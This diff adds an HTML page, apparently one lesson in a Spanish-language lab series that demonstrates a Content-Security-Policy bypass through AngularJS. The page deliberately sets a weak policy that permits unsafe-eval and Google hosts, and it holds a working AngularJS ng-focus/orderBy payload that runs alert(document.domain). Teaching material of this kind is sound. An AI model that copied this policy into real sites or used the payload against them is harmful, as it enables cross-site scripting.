@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html data-theme="light">
+
+<head>
+  <!-- vim: set ft=html: -->
+  <!-- Force Neovim to use HTML as filetype instead of angular -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light">
+  <link rel="stylesheet" href="../node_modules/@picocss/pico/css/pico.blue.min.css">
+  <link rel="stylesheet" href="../node_modules/@picocss/pico/css/pico.colors.min.css">
+
+  <script src="../node_modules/@highlightjs/cdn-assets/highlight.min.js"></script>
+  <link rel="stylesheet" href="../node_modules/@highlightjs/cdn-assets/styles/dark.min.css">
+
+  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; &#39;unsafe-eval&#39; https://*.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;">
+  <script src="script.js"></script>
+  <title>03 - CSP bypass usando AngularJS</title>
+</head>
+
+<body>
+  <main class="container">
+    <hgroup>
+      <h1>
+        03 - CSP bypass usando AngularJS
+      </h1>
+      
+        <p class="pico-background-red-500">Ejemplo vulnerable</p>
+      
+    </hgroup>
+
+    <fieldset>
+      <label>
+        <input id="dark-mode-toggle" type="checkbox" role="switch" />
+        Dark mode
+      </label>
+    </fieldset>
+
+    <section>
+      <h2>Content-Security-Policy:</h2>
+      <pre><code id="csp-content" class="language-http"></code></pre>
+    </section>
+
+    <section>
+      <h2>Payload:</h2>
+      <pre><code id="payload-content" class="language-html"></code></pre>
+      <button id="inject">Inject</button>
+      <a href="03.html" role="button" class="secondary outline">Restart</a>
+    </section>
+
+    <section>
+      <div id="injection">
+      </div>
+    </section>
+
+    <nav>
+      <ul>
+        <li>
+          <a href="02.html" role="button" class="secondary outline" >&lt; Anterior</a>
+        </li>
+      </ul>
+      <ul>
+        <li>
+          <a href="04.html" role="button" class="secondary outline" >Siguiente &gt;</a>
+        </li>
+      </ul>
+    </nav>
+
+    <template id="payload-template"><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+
+<div ng-app ng-csp>
+  <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
+</div></template>
+  </main>
+</body>
+
+</html>
